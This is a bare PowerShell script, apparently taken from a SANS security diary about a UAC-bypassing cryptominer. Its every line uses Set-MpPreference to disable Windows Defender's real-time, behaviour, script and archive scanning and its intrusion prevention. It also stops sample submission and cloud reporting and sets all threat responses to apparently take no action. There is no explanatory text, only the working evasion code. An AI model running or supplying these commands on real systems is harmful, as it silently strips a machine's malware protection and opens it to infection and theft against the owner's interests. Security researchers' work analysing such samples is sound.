# From https://isc.sans.edu/diary/Bypassing+UAC+to+Install+a+Cryptominer/25644

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Ignore;
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Ignore;
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Ignore;
Set-MpPreference -DisableIOAVProtection $true -ErrorAction Ignore;
Set-MpPreference -DisablePrivacyMode $true -ErrorAction Ignore;
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction Ignore;
Set-MpPreference -DisableArchiveScanning $true -ErrorAction Ignore;
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Ignore;
Set-MpPreference -DisableScriptScanning $true -ErrorAction Ignore;
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;